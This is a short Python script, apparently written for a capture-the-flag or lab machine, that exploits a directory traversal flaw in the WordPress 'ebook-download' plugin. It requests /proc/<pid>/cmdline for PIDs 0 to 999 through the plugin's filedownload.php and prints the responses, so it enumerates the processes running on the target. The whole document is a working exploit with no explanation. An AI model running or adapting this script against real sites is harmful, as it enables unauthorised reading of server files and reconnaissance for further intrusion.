import requests

for i in range (0,1000):
    

    tgturl = "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/" + str(i) + "/cmdline"
    req = requests.get(tgturl)
    length = len(req.content)
    if (length > 90):
        print("PID: " + str(i))
        print("   URL: " + tgturl+'\n')
        print("   Response: " + str(req.content) + '\n')


